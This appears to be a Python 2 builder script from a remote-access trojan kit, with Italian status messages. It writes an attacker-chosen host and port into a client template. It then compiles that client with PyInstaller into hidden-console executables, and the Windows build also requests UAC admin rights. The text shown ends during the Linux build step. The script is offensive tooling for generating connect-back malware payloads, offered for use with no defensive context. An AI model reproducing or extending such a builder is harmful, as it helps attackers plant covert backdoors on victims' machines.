#!/usr/bin/python2.7
# -*- coding: utf-8 -*-try:
import socket
import os, subprocess
import random
import time
try:
    import pip
except:
    os.system('sudo apt-get install python-pip -y')
if os.getuid() != 0:
    print "\033[1;31mYou Need To Be Root!\033[1;31m"
    exit()
try:
    from termcolor import colored
except:
    pip.main(['install', 'termcolor'])
    from termcolor import colored

def error(text):
    print(colored("[Errore] ", 'red',attrs=['bold'])+colored("{}".format(text), 'white'))
def info(text):
    print(colored("[Info] ", 'blue',attrs=['bold'])+colored("{}".format(text), 'white'))

conf = 'configs/client.txt'
FNULL = open(os.devnull, 'w')

def configure(host,port):
    with open('configs/client.txt', 'r') as file:
        data = file.readlines()
        data[10] = "host = '{}'\n".format(host)
        data[11] = "port = {}\n".format(port)
    with open('configs/client.txt', 'w') as file:
        file.writelines(data)
    os.system("sudo cp configs/client.txt core/client.py")

def generate(windows,linux,macos,raw,name):
    global FNULL
    if windows == False and linux == False and macos == False and raw == False:
        print ""
        error("per favore usa --windows/--linux/--macos/-raw/--all")
        time.sleep(1)
        exit()
    if windows == True:
        print""
        info("Creazione payload per windows ..")
        time.sleep(1)
        info("Posizione Fle: {}/dist/{}.exe".format(os.getcwd(),name))
        try:
            subprocess.Popen("file /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe",shell=True,stdout=FNULL,stderr=FNULL)
        except:
            error("PyInstaller in Wine non trovato!")
            exit()
        subprocess.Popen("sudo wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --uac-admin --noconsole -F --clean -n {} core/client.py".format(name),shell=True,stdout=FNULL,stderr=FNULL)
        time.sleep(1)
    else:
        pass
    if linux == True:
        print""
        info("Creazione payload per linux ..")
        time.sleep(1)
        info("Posizione Fle: {}/dist/{}".format(os.getcwd(),name))
        try:
            subprocess.Popen("file /usr/local/bin/pyinstaller",shell=True,stdout=FNULL,stderr=FNULL)
        except:
            error("PyInstaller non trovato!")
            exit()
        subprocess.Popen("sudo pyinstaller -noconsole -F --clean -n {} core/client.py".format(name),shell=True,stdout=FNULL,stderr=FNULL)
        time.sleep(1)
